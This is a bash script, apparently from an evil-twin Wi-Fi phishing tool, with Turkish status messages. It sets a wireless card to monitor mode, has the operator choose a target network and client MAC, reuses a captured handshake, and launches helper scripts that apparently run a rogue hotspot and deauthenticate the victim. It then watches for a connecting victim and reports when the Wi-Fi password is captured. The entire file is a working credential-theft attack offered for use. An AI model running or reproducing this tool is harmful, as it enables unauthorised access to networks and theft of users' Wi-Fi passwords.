if ifconfig | grep wlan1mon; then
cd hotspot

bash run.sh 
cd ..

echo 0 > files/data/status.txt


while true; do

if ping 192.168.1.3 -w 1 | grep "1 packets transmitted, 1 received, 0% packet loss,";then
echo ""
echo "birisi baglandi [!]"
echo ""

while true; do
if  cat files/data/status.txt | grep 1 ;then
echo ""
echo "sifre alindi"
echo ""
echo " " > files/data/status.txt
bash exit.sh
exit
elif cat files/data/status.txt | grep 2 ;then
echo ""
echo "basarisiz deneme "
echo ""
echo " " > files/data/status.txt
elif ping 192.168.1.3 -w 1 | grep "1 packets transmitted, 1 received, 0% packet loss,";then
sleep 0
else
echo "
 kullanıcı ayrıldı
"
echo " " > files/data/status.txt
break
fi
done
fi
done

else


#wifite --skip-crack --no-pmkid -i mon0
airmon-ng start wlan1
airodump_ng wlan1mon
echo ""
read -p "wifi name >> " essid
read -p "MODEM BSSiD >> " bssid
read -p "channel no >> " channel
airodump-ng --bssid $bssid --channel $channel wlan1mon
echo ""
read -p "user mac address >> " mac


rm files/data/handshake.cap
cp hs/hand* files/data/handshake.cap 
cd files
python3 run.py $essid $bssid $channel
cd ..
python3 d.py $bssid $mac  
fi


